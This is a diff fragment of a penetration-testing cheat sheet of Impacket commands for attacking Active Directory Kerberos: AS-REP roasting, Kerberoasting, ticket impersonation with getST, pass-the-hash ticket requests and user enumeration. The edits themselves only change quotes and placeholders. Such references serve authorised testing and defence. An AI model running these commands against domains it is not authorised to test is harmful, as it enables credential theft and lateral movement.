@@ -8,10 +8,10 @@
 GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
 ```
 
-## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
+## GetNPUsers - attempt to list and get TGTs for those users that have the property 'Do not require Kerberos preauthentication' (ASREPRoasting)
 #plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
 ```
-GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
+GetNPUsers.py -dc-ip <rhost> <domain>/ -usersfile <users.txt> -format hashcat
 ```
 
 ## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
@@ -56,7 +56,7 @@ getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
 getTGT.py -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
 ```
 
-## GetADUser - gather data about the domain’s users and their corresponding email addresses
+## GetADUser - gather data about the domain's users and their corresponding email addresses
 #plateform/linux #target/remote  #cat/RECON 
 ```
 GetADUsers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
